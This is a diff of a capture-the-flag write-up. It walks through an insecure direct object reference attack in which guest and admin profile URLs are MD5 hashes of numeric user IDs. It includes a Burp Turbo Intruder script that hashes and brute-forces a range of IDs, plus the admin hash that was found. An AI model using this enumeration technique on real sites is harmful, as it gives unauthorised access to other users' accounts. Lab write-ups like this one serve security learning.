@@ -3,12 +3,12 @@ Logged in on vulnerable platform provided by CTF using pre-provided credentials
 after logging in a text popped up 
 ```Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.```
 
-understood that the our logged-in session is not privileged enough. Understood have to somehow find or make own account privileged enough to access the flag
+understood that the my logged-in session is not privileged enough. Understood have to somehow find or make own account privileged enough to access the flag
 
-noticed Guest (ID: 3000), and then gone to check how request/response looks like in burpsuite to get some clue about what 
+noticed Guest (ID: 3000), and then gone to check how request/response looks like in burpsuite(Proxy) to get some clue about what 
 ```Guest (ID: 3000)``` is?
 
-found nothing related to Guest (ID: 3000) in request... then noticed weird string in request 
+I found no direct references to "Guest (ID: 3000)" in the request. However, I noticed an unusual string in the URL path:
 ```GET /profile/user/e93028bdc1aacdfb3687181f2031765d HTTP/1.1```
 
 scanned weird string using hash-identifier tool and found out that its a MD5 hashed string(32-char hex) 
@@ -30,7 +30,7 @@ def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=5)
 
-    for uid in range(___, ___):   # <- your actual range goes here
+    for uid in range(___, ___):   # <- actual range goes here
         h = md5(uid)
         engine.queue(target.req, h)
 
@@ -39,10 +39,11 @@ def handleResponse(req, interesting):
 ```
 code explaination:
 imported hashlib library 
-encrypted each ID number with MD5 gave it UID range 0-20 and 3000+-20
+encrypted each ID number with MD5 gave it UID range 0-20 & above/below 3000
 filtered interesting requests/responses
 
-Ran the attack and reviewed responses — looked for any response that didn’t say “Guest” / “Insufficient privileges”, which would indicate a hit on a staff/admin ID and looked for 200ok response other than my own account
+Ran the attack and reviewed responses — looked for any response that didn’t say “Guest” / “Insufficient privileges”, which would indicate a hit on a staff/admin ID
 
 Found the admin ID, got the flag — successfully landed on an admin-level profile and captured the flag
+at request ```GET /profile/user/53a1320cb5d2f56130ad5222f93da374 HTTP/1.1``` (3016)
 <img width="785" height="81" alt="image" src="https://github.com/user-attachments/assets/d984da30-2ff0-4097-bd97-408e5d1ee759" />
